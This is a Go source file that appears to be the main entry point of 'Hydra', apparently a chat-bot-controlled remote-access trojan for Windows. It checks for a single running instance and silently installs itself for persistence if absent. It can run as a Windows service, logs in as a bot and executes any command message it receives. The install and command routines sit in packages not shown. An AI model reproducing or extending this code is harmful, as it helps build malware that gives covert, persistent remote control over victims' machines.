package main

import (
	"log"
	"os"
	"time"

	"github.com/Raffy27/Hydra/api"
	"github.com/Raffy27/Hydra/commands"
	"github.com/Raffy27/Hydra/install"
	"github.com/Raffy27/Hydra/util"
	"github.com/zetamatta/go-outputdebug"
	"golang.org/x/sys/windows/svc"
)

func init() {
	//Patch os.Args[0] to work with absolute paths later
	if fp, err := os.Executable(); err == nil {
		os.Args[0] = fp
	}
}

func checkSwitch(sw string) bool {
	for _, arg := range os.Args[1:] {
		if arg == sw {
			return true
		}
	}
	return false
}

func main() {

	//log.SetFlags(0)
	log.SetOutput(outputdebug.Out)

	if checkSwitch("chill") {
		log.Println("Sleeping for 5 seconds")
		time.Sleep(5 * time.Second)
	}

	//Check single instance
	util.CheckSingle()

	//Check persistence
	if !install.IsInstalled() {
		log.Println("Install info does not exist")
		install.Install()
	} else {
		install.ReadInstallInfo()
		log.Println("Already installed")
	}

	//Handle service mode
	if os.Getenv("poly") == "" {
		if chk, _ := svc.IsWindowsService(); chk {
			install.HandleService(main)
		}
	}
	os.Chdir(install.Info.Base)

	log.Println("Logged in as", api.Bot.Self.UserName)
	//api.NewGenesis()
	log.Println("Genesis is", api.Genesis)
	//go api.Heartbeat()
	for u := range api.Updates {
		if u.Message == nil {
			continue
		}
		log.Printf("[%s] %s", u.Message.From.UserName, u.Message.Text)
		if u.Message.IsCommand() {
			go commands.Perform(u.Message)
		}
	}
}
